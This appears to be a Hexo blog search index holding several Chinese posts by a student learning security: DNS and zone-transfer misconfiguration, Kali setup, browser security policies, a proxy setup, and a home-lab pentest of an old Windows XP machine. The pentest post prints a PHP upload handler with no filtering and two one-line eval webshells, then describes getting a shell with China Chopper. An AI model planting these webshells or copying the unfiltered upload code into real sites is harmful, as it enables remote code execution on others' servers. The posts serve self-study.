<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>DNS服务以及DNS域传送漏洞</title>
    <url>/2020/03/01/DNS%E6%9C%8D%E5%8A%A1%E4%BB%A5%E5%8F%8ADNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        疫情影响，宅在家里，开学推迟，要上网课，有课名叫，网络攻防，要上实验，网上靶机，可是靶机，实在不行，自己搭建，两眼蒙蔽，从头做起，选择放弃。(哭)</p>
<p>​        这次要做的实验内容和DNS域传送漏洞有关，其实也是用工具进行信息收集，之前忽略了信息收集这块，觉得不太重要，但是现在回头来看，这是最重要的一部分，自己也回头补补。</p>
<a id="more"></a>

<h1 id="DNS服务：因特网的目录服务"><a href="#DNS服务：因特网的目录服务" class="headerlink" title="DNS服务：因特网的目录服务"></a>DNS服务：因特网的目录服务</h1><p>​        之前看过《计算机网络：自顶向下方法》这本书对DNS的讲解，确实不错，但是当时读的有些晦涩难懂，现在回头去看有些地方确实重新理解到了。现在重新理解回忆一波DNS。</p>
<h2 id="DNS定义"><a href="#DNS定义" class="headerlink" title="DNS定义"></a>DNS定义</h2><p>​        在因特网的主机中，有一种标识方式就是用它的主机名(hostname)，例如：<code>www.baidu.com</code>，<code>www.4399.com</code>等，但是主机名并没有透漏多少在因特网中的位置信息，实际上在因特网上的主机通信是用IP地址来进行的。人们喜欢用主机名的标识方式使用，而路由器喜欢定长，有层次结构的IP地址。为了折中，就产生了DNS(Domain Name System)域名系统，用于进行主机名到IP地址转换的目录结构。</p>
<p>​        DNS是：</p>
<ol>
<li>一个由分层的DNS服务器实现的分布式数据库。</li>
<li>一个使得主机能查询分布式数据库的应用层协议。</li>
</ol>
<p>​        DNS服务器通常是运行BIND软件的UNIX机器，DNS在进行区域传输的时候使用TCP协议，其它时候则使用UDP协议，使用TCP53端口和UDP53端口。(DNS只有两种报文，查询/回答报文)</p>
<h2 id="DNS工作过程"><a href="#DNS工作过程" class="headerlink" title="DNS工作过程"></a>DNS工作过程</h2><p>例如用户在浏览器中请求URL：<code>www.example.com/index.html</code>则会发生以下过程：</p>
<ol>
<li>浏览器从上述URL中抽取主机名<code>www.example.com</code>并交给同一机器上运行的DNS客户端</li>
<li>DNS客户端向DNS服务器发送一个包含主机名的请求</li>
<li>DNS客户端最终会收到一份回答报文，其中含有对应与该主机名的IP地址</li>
<li>浏览器收到来自DNS客户端的该IP地，它能向位于该IP地址的80端口的HTTP服务器进程HTTP请求</li>
</ol>
<h2 id="DNS的其他服务"><a href="#DNS的其他服务" class="headerlink" title="DNS的其他服务"></a>DNS的其他服务</h2><ul>
<li>主机别名：有复杂主机名的主机可以拥有一个或多个别名，例如一台规范主机名为relay1.west-coast.enterprise.com可能有两个别名<code>enterprise.com</code>或者<code>www.enterprise.com</code>。应用程序可以调用主机别名来获得规范主机名和IP地址</li>
<li>邮件服务器别名：例如<code>example@gmail.com</code>，中邮件服务器别名为<code>gmail.com</code>比它的规范主机名好记的多</li>
<li>负载分配：用于冗余的服务器或者具有CDN的服务器上。要访问的站点被分布在多台服务器上，具有不同的IP地址，因此一个IP地址集合与同一个规范主机名所联系。当客户对其发送一个DNS请求时候，DNS服务器用IP地址的整个集合进行响应，但在每个回答中循环这些地址次序。</li>
</ul>
<h2 id="DNS组织方式"><a href="#DNS组织方式" class="headerlink" title="DNS组织方式"></a>DNS组织方式</h2><h3 id="DNS结构"><a href="#DNS结构" class="headerlink" title="DNS结构"></a>DNS结构</h3><p>​        从DNS的工作方式来看，DNS不可能是单一集中的数据库，而是使用大量的DNS服务器，以层次方式组织。大致来说DNS有三种基本类型：根DNS服务器，顶级域(TLD),DNS服务器，权威服务器。</p>
<p><img src="https://s2.ax1x.com/2020/03/01/3cJecF.png" alt="3cJecF.png"></p>
<p>​        如果你的请求没有命中本地DNS服务器缓存，那么这个缓存服务器就会自己进行一次标准查询，然后再把结果缓存起来，简单来说就是从根服务器开始一级一级的问。我们以前经常谈到根服务器的重要性其实就体现在这里了，它保留了对所有域名的起始解释权。</p>
<p>​        根服务器拥有一切域名的起始解释权，但是如果你去问根服务器它是不会直接告诉你最终答案的。因为如果它要存储所有的记录，那它也太累了，这个负载和开销是惊人的。那它会告诉你什么呢？它会告诉你应该去问谁，也就是它授权下一级服务器来解答你的问题。拟人化这个过程:</p>
<ol>
<li>我（本地DNS服务器）: root, root 告诉我， example.com 怎么走？</li>
<li>root: 呵呵，你可以去问.com的dns服务器，地址是xxxxxx</li>
<li>我: .com, .com 告诉我，example.com 怎么走？</li>
<li>.com: 呵呵，你可以去问example.com的dns服务器(dnspod之类的)，地址是xxxxxx</li>
<li>我: dnspod, dnspod 告诉我，example.com 怎么走？</li>
<li>dnspod: 拿着 xxxxxx，走你</li>
</ol>
<p>​        这个例子假设TLD服务器直到用于主机的权威DNS服务器的IP地址，一般来说，这种假设不总是正确，相反，TLD服务器只知道某个中间的DNS服务器，该中间的DNS服务器依次才知道用于该主机的权威DNS服务器。上述例子利用了递归查询和迭代查询，从自己主机到本地DNS服务器查询是递归的，本地DNS服务器查询是迭代的。</p>
<h3 id="DNS缓存"><a href="#DNS缓存" class="headerlink" title="DNS缓存"></a>DNS缓存</h3><p>​        实际中，为了改善时延和减少因特网中DNS报文数量，DNS广泛采用了缓存技术。在一个请求链中，某个DNS服务器在收到DNS回答报文时，它能将映射缓存到服务器中，缓存并不是永久的，DNS服务器在一段时间后将丢弃缓存的信息。本地DNS服务器也能够缓存TLD服务器的IP地址，因此允许本地服务器DNS查询绕过查询链中的根DNS服务器。</p>
<h2 id="DNS记录"><a href="#DNS记录" class="headerlink" title="DNS记录"></a>DNS记录</h2><p>​        一条DNS记录就是一个映射关系，它的大致结构是（Name,Value,Type,TTL）其中TTL是该记录的生存时间。</p>
<p>其中Type类型有多种：</p>
<blockquote>
<p>（1） <code>A</code>：地址记录（Address），返回域名指向的IP地址。</p>
<p>（2） <code>NS</code>：域名服务器记录（Name Server），返回保存下一级域名信息的服务器地址。该记录只能设置为域名，不能设置为IP地址。</p>
<p>（3）<code>MX</code>：邮件记录（Mail eXchange），返回接收电子邮件的服务器地址。</p>
<p>（4）<code>CNAME</code>：规范名称记录（Canonical Name），返回另一个域名，即当前查询的域名是另一个域名的主机别名。</p>
<p>（5）<code>PTR</code>：逆向查询记录（Pointer Record），只用于从IP地址查询域名，详见下文。</p>
</blockquote>
<h2 id="在DNS数据库中插入记录"><a href="#在DNS数据库中插入记录" class="headerlink" title="在DNS数据库中插入记录"></a>在DNS数据库中插入记录</h2><p>​    如果你刚刚创建了一个新公司，那么你必定要做的第一件事就是在注册登记机构注册域名newcompany.com，则需要向该机构提供你的基本和辅助权威DNS服务器的名字和IP地址，例如为：dns1.newcompany.com和dns2.newcompany.com以及212.212.212.1和212.212.212.2。对这两个权威DNS服务器的每一个，该机构都要确保将一个类型为NS和一个类型为A的记录输入TLD com服务器，特别是对于用于newcompany.com的基本权威服务器。</p>
<blockquote>
<p>(newcompany.com, dns1.newcompany.com, NS)</p>
<p>(dns1.newcompany.com, 212.212.212.1, A)</p>
</blockquote>
<p>​    那么此时有个新用户想要访问你的公司主页<code>www.newcompany.com</code>，那么用户的DNS客户端先向本地的DNS服务器发送请求，本地的DNS服务器向TLD com服务器发送请求(如果本地DNS服务器没有缓存TLD com服务器的地址，那么它会先向根DNS服务器发送请求TLD com服务器的地址)，TLD com服务器向本地DNS服务器回答上述的两条DNS记录，本地DNS服务器则会根据上述两条记录向公司的权威DNS服务器发送DNS请求报文，而权威DNS服务器会回答一个具有类型为A的DNS记录的DNS报文，里面含有你要请求的站点的IP地址，例如：212.212.71.4，本地的DNS服务器会把这条DNS记录发给用户的DNS客户端并且在服务器中缓存一段时间，用户则会对这个IP地址发起一个TCP连接，并在该连接上发送一个HTTP请求。</p>
<p>参考文章：    </p>
<ol>
<li><a href="https://segmentfault.com/a/1190000002578457" target="_blank" rel="noopener">https://segmentfault.com/a/1190000002578457</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2016/06/dns.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/06/dns.html</a></li>
</ol>
<h1 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>​        DNS作为重要的互联网基础设施，难免成为黑客的重点攻击目标，服务的稳定性尤为重要。DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指后备服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。</p>
<p>​        若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>域传送关键配置项为：配置位置在/etc/named.conf文件中</p>
<p>allow-transfer {ipaddress;}; 通过ip限制可进行域传送的服务器</p>
<p>allow-transfer { key transfer; }; 通过key限制可进行域传送的服务器</p>
<p>测试版本为BIND 9.8.2rc1-RedHat-9.8.2-0.10.rc1.el6_3.6，默认安装完毕后，配置项没有allow-transfer 项。如果直接使用默认配置文件进行配置的话（不手动添加allow-transfer项），就会存在dns 域传送漏洞。</p>
<p><img src="https://s2.ax1x.com/2020/03/01/3gA8nU.png" alt="3gA8nU.png"></p>
<p>可以看到此时DNS服务器域传输失败，说明不存在漏洞。</p>
<p><img src="https://s2.ax1x.com/2020/03/01/3gAcAH.png" alt="3gAcAH.png"></p>
<p>注释掉这一行，开启任意DNS域传送。</p>
<p><img src="https://s2.ax1x.com/2020/03/01/3gA4jf.png" alt="3gA4jf.png"></p>
<p>此时可以看到服务器所有的子域名。</p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>解决域传送问题非常简单，只需要在相应的zone、options中添加allow-transfer限制可以进行同步的服务器就可以了，可以有两种方式：限制IP、使用key认证。</p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>DNS</tag>
        <tag>DNS域传送漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>kali-19.4汉化以及伪装win10界面</title>
    <url>/2020/02/28/kali-19-4%E6%B1%89%E5%8C%96%E4%BB%A5%E5%8F%8A%E4%BC%AA%E8%A3%85win10%E7%95%8C%E9%9D%A2/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        之前用虚拟机做实验的时候汉化过一次，后来文件被删了，现在又要因为实验要求重新下载一次，但是忘记kali的汉化过程，这次特意记录一下。我用的是kali-2019.4版本，这个版本新上线了一个可以伪装成Windows10的功能，也挺有意思的。</p>
<a id="more"></a>

<h1 id="汉化过程"><a href="#汉化过程" class="headerlink" title="汉化过程"></a>汉化过程</h1><p>​        首先把kali的下载源更改为国内：kali源：</p>
<p>​        <code>vim /etc/apt/source.list</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#中科大</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#阿里云</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#清华大学</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">#浙大</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.zju.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.zju.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">#官方源</span><br><span class="line">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<ol>
<li><p>更新源和软件</p>
<p><code>apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get clean</code></p>
</li>
<li><p>选语言</p>
<p><code>dpkg-reconfigure locales</code></p>
<p>进入图形界面，选中en_US.UTF-8 UTF-8和zh_CN.UTF-8 UTF-8（空格是选择，tab是切换，*是选中）并将zh_US.UTF-8选为默认。</p>
</li>
<li><p>安装中文字体</p>
<p><code>apt-get install xfonts-intl-chinese</code></p>
<p><code>apt-get install ttf-wqy-microhei</code></p>
</li>
<li><p>重启kali</p>
<p>重启若还是英文，就继续重启，基本一到两次后就可以了</p>
</li>
</ol>
<h1 id="win10-模式"><a href="#win10-模式" class="headerlink" title="win10 模式"></a>win10 模式</h1><p>终端执行 <code>kali-undercover</code></p>
<p><img src="https://s2.ax1x.com/2020/02/28/3rtbOs.png" alt="3rtbOs.png"></p>
<p>再次输入 <code>kali-undercover</code>即可退出win10模式</p>
<p><img src="https://s2.ax1x.com/2020/02/28/3rNZtK.png" alt="3rNZtK.png"></p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试实战--家用电脑</title>
    <url>/2020/02/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98-%E5%AE%B6%E7%94%A8%E7%94%B5%E8%84%91/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        因为疫情的影响导致现在还没有开学，在家里呆的有些无聊，最近也在学习渗透方面的知识，但是关于渗透测试，纸上得来终觉浅，绝知此事要躬行，还是要得累计实战经验，所以我就把目标转向了我家的家用台式电脑，就想搞一下。</p>
<a id="more"></a>

<h1 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h1><p>​        家用电脑比较老旧，是在我上初中的时候买的，甚至系统还是<strong>Windows xp</strong>，属于可以进博物馆的古董机，没办法，有靶机已经不错了，无论是虚拟机还是网上的靶场都感觉不得劲，还是物理机有搞头。</p>
<p>​        我开始的时候是想用IIS建站的，但是中间有很多坑，这不算什么，<strong>一杯茶一包烟，一改配置坐一天</strong>，就当我觉得环境搭建成功的时候，我又发现了新的坑，一个是没有php环境，而且IIS支持asp，这也不算什么，但是又发现，开始的时候可以访问的资源莫名其妙的都无权访问了，网页报401，草(一种植物)，在尝试了网上很多方法了之后，我哭了，我放弃了，xp下的IIS服务的权限设置我搞不懂，还是我太弱了，我真是个垃圾(猛男哭泣)。</p>
<p>​        我屈服了，我使用了phpstudy的傻瓜式操作建站，只能说真香，它是如此的便捷，如此的丝滑，我又一次哭了。</p>
<p><img src="https://s2.ax1x.com/2020/02/23/31dxbR.png" alt="31dxbR.png"></p>
<p>还是觉得老版本的phpstudy好用，关于phpstudy的安装和使用就不多说了，直接进入正题。</p>
<p>首先，测试一下，查看一下靶机IP</p>
<p><img src="https://s2.ax1x.com/2020/02/23/31SMLT.png" alt="31SMLT.png"></p>
<p>发现是192.168.0.122</p>
<p>在本机上测试ping一下</p>
<p><img src="https://s2.ax1x.com/2020/02/23/31p9h9.png" alt="31p9h9.png"></p>
<p>可以连上，在浏览器中查看</p>
<p><img src="https://s2.ax1x.com/2020/02/23/31wssJ.png" alt="31wssJ.png"></p>
<p>没问题，环境搭建好了，现在开始测试</p>
<h1 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h1><p>先给靶机配上编辑器，要不用记事本写太变态了。这里我用的notepad++。</p>
<p>这里我准备用上文件上传漏洞来上传一个webshell，用到菜刀连接获取靶机的权限。</p>
<p>所以在靶机中写上一个具有文件上传功能的网页：</p>
<p><img src="https://s2.ax1x.com/2020/02/23/31HMF0.png" alt="31HMF0.png"></p>
<p>这里的HTML代码为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>请上传一个文件<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload_file.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>php代码为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"error:"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"upload:"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"type:"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"size:"</span>.($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>).<span class="string">"kb&lt;br&gt;"</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],<span class="string">"upload/"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"stored in:"</span>.<span class="string">"upload/"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从php代码中可以看到没有对上传文件做任何的过滤，当然现实中这种是极少的，只有在靶机中才会出现。</p>
<p>我这里上传了两个php文件，都是一句话木马，只是数据上传方式不同而已，一个是post，一个是get</p>
<p><img src="https://s2.ax1x.com/2020/02/23/33FKKA.png" alt="33FKKA.png"></p>
<p><img src="https://s2.ax1x.com/2020/03/03/3fGQKK.png" alt="3fGQKK.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>@的作用是用来不显示报错的</p>
<p><img src="https://s2.ax1x.com/2020/02/23/31b5U1.png" alt="31b5U1.png"></p>
<p>这个是get类型的一句话木马</p>
<p><img src="https://s2.ax1x.com/2020/02/23/33i9Tf.png" alt="33i9Tf.png"></p>
<p>这个是post类型的一句话木马（图中用的是chrome的hackbar插件）</p>
<p>这样就将一个webshell上传到了服务器了，我们用中国菜刀连接获得权限：</p>
<p><img src="https://s2.ax1x.com/2020/02/23/33Ah4K.png" alt="33Ah4K.png"></p>
<p>连接到了就拿取了靶机的shell</p>
<p><img src="https://s2.ax1x.com/2020/02/23/33AXUP.png" alt="33AXUP.png"></p>
<p>我们可以在靶机桌面上新建一个文件，写一句话</p>
<p><img src="https://s2.ax1x.com/2020/02/23/33ZNBd.png" alt="33ZNBd.png"></p>
<p><img src="https://s2.ax1x.com/2020/02/23/33VT0A.png" alt="33VT0A.png"></p>
<p>这样我们可以看到靶机的桌面上就有了一个文本问价，里面就包含了这句话</p>
<p><img src="https://s2.ax1x.com/2020/02/23/33ZI3T.png" alt="33ZI3T.png"></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>​        这一次的渗透测试很简单，主要是尝试一些工具的使用和环境的配置以及网站的搭建（有点不成功的），也没有多少难度，最主要的是服务器后端php代码没有严格对上传文件的过滤检查，才是造成文件上传漏洞的成因，这一点是对网站搭建人员要注意和留心的，之后我会尝试写一些过滤方案，以及绕过的方法（因为没有绝对安全的系统）。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>文件上传漏洞</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器安全</title>
    <url>/2020/02/18/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h1 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h1><p>​        浏览器的安全策略有很多，比如同源策略，csp，cookie设置，以及浏览器沙箱等，都是游览器安全策略的内容。本文用于记录和理解这些设施，随时扩充，不断学习。</p>
<a id="more"></a>

<h2 id="同源策略-same-origin-policy"><a href="#同源策略-same-origin-policy" class="headerlink" title="同源策略 (same-origin policy)"></a>同源策略 (same-origin policy)</h2><p>​        同源策略是浏览器最核心也最基本的安全功能。</p>
<p>​        内容：在同一个域内，客户端脚本可以任意读写同源内的资源，dom,cookie；但是在不同的域，就不能加载任何资源。即就是不同源的客户端脚本，在没有明确策略，不能访问和修改对方资源。</p>
<p>​        同源：协议，端口，域名三者都相同，称为一个域。</p>
<h2 id="内容安全策略-content-security-policy"><a href="#内容安全策略-content-security-policy" class="headerlink" title="内容安全策略(content-security-policy)"></a>内容安全策略(content-security-policy)</h2><p>​        通过编码在HTTP响应头中的指令来实施策略，用于指定前端网页加载资源的来源。在response中content-security-polity中。(白名单的方式)</p>
<p><code>Content-Security-Polity:script-src &#39;self&#39; https://baidu.com</code></p>
<p>这句的意思是信任来源于百度域名的脚本和当前域名的脚本加载。</p>
<blockquote>
<p><code>default-src</code> : 该指令在某种资源类型指定指令没有被定义的情况下制定了所有资源类型的加载策略(即默认的资源加载策略)</p>
<p><code>script-src</code> : 该指令指定了Web应用程序可以加载的脚本的域或URL</p>
<p><code>object-src</code> : 该指令制定了Web应用程序可以加载的插件，如Falsh</p>
<p><code>style-src</code> : 该指令制定了Web应用程序可以加载的CSS样式表的域或URL</p>
<p><code>img-src</code>: 该指令指定了Web应用程序可以加载的图片的域或URL</p>
<p><code>media-src</code> : 该指令指定了Web应用程序可以加载的音视频的域或URL</p>
<p><code>frame-src</code> : 该指令指定了Web应用程序可以加载的框架的域或URL</p>
<p><code>font-src</code> : 该指令指定了Web应用程序可以加载的字体的域或URL</p>
<p><code>connect-src</code> : 该指令指定了Web应用程序可以加载的像XHR, WebSockets, 以及EventSource等脚本接口的域或URL</p>
<p><code>plugin-types</code> : 该指令指定了哪些MIME类型的插件可以被加载(浏览器支持度不够)</p>
<p><code>form-action</code> : 该指令指定了HTML表单可以提交的URLS(浏览器支持度不够)</p>
<p><code>reflected-xss</code> : 该指令告诉浏览器开启或关闭任何用于过滤或组织反射跨站脚本攻击的启发式算法，这相当于X-XSS-Protection响应头的效果(浏览器支持度不够)</p>
</blockquote>
<p>使用方式：</p>
<ol>
<li>在前端页面<code>&lt;meta&gt;</code>中设置</li>
<li>在服务端设置</li>
</ol>
<h2 id="浏览器沙箱"><a href="#浏览器沙箱" class="headerlink" title="浏览器沙箱"></a>浏览器沙箱</h2><p>​        黑客会在网页中插入一段恶意代码，然后利用浏览器漏洞来执行任意代码，这就叫做 <strong>挂马</strong>。它是浏览器所面对的一种主要的威胁。</p>
<p>​        浏览器为了应对 “挂马” 威胁，从<strong>单进程架构</strong>转变为<strong>多进程架构</strong>。浏览器的多进程架构，会分开浏览器的各个功能模块。这样当一个浏览器进程崩溃时，也不会影响到其他的浏览器进程。这个架构能容许多个程序同时运行而互不影响，每个网页标签都是独立于窗口程序而存在，当资源过高或崩溃时，不会因为一个停顿而整个程序当掉。这样做，可以极大地提升用户体验。</p>
<p>​        沙箱设计的目的是为了让不可信的代码运行在一定的环境中，从而限制这些代码访问<strong>隔离区</strong>之外的资源。如果因为某种原因，确实需要访问隔离区外的资源，那么就必须通过的指定的通道，这些通道会进行严格的安全检查，来判断请求的合法性。通道会采取<strong>默认拒绝</strong>的策略，一般采用封装 API 的方式来实现。</p>
<p>​        Chrome 浏览器包含浏览器进程、渲染进程、插件进程以及扩展进程。插件进程，比如 flash、java 等进程会与浏览器进程严格隔离。</p>
<p>​        Chrome 中的每一个<strong>标签页</strong>都是一个沙箱（sandbox）。为了防止“恶意软件破坏用户系统”或“利用标签页影响其他标签页”。沙箱遵循最小权限原则，每个动作的权限都会被限制，仅能运算而无法写入文件和从敏感区域（即受保护区域）读取文件（如我的文档、桌面）。例如在其中一个标签页运作的恶意软件，将无法窃取信用卡号码、干扰鼠标运作，或告诉系统在启动时运行某个程序，并且恶意软件会在标签页关闭时立即中止。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>同源策略</tag>
        <tag>内容安全策略</tag>
      </tags>
  </entry>
  <entry>
    <title>VPN相关设置-shadowsocksR</title>
    <url>/2020/02/14/VPN%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE-shadowsocksR/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        之前一直用的my2one的服务器代理，pc和移动端也用的ShadowsocksR，也就是SSR，一些设置之前也是用的my2one给的教程，一直没手动设置过，现在想用用TOR游览器，不过开始之前先把VPN设置好，别暴露了自己的IP和位置。</p>
<p>（更新：使用tor游览器访问暗网）</p>
<a id="more"></a>

<h2 id="VPN三种系统代理模式"><a href="#VPN三种系统代理模式" class="headerlink" title="VPN三种系统代理模式"></a>VPN三种系统代理模式</h2><p>​        vpn的系统代理有三种模式，分别是直连模式，全局模式和PAC模式。</p>
<p>​        直连模式，顾名思义就是主机在数据交互时候不使用vpn代理，和没开vpn是一样的，在不使用vpn的场合可以用到直连模式。</p>
<p>​        全局模式，就是将主机所有的数据交互都要经过vpn服务器的代理，也就是主机在通信的时候经过了第三方代理，此时可以隐藏主机的IP地址，当然，也可以绕过GFW。</p>
<p>​        PAC模式，就是主机在连接网站的时候读取PAC文件里面的规则，查看网站是否被墙，如果符合，那就开启VPN服务进行代理，而PAC列表一般从GFWList进行更新。</p>
<h2 id="用SSR-Proxy-SwitchyOmega进行网站代理"><a href="#用SSR-Proxy-SwitchyOmega进行网站代理" class="headerlink" title="用SSR+Proxy SwitchyOmega进行网站代理"></a>用SSR+Proxy SwitchyOmega进行网站代理</h2><p>​        SSR这边我订阅了my2one的服务器，这边代理规则我设置为绕过局域网和大陆，不过我在SSR这边选项设置了端口6666为代理端口，把系统代理设置为直连，这样只会将主机走6666端口的数据进行代理。</p>
<p>​        Proxy SwitchyOmega这边先设置了一个proxy的情景模式，让本地6666端口做代理。</p>
<p>​        然后再设置一个 auto switch 的自动切换模式，导入AutoProxy的格式的规则列表，网址为<a href="https://github.com/gfwlist/gfwlist/raw/master/gfwlist.txt" target="_blank" rel="noopener">https://github.com/gfwlist/gfwlist/raw/master/gfwlist.txt</a></p>
<p>​        按照规则列表匹配请求，让它们过proxy情景模式，剩下的都直接连接。</p>
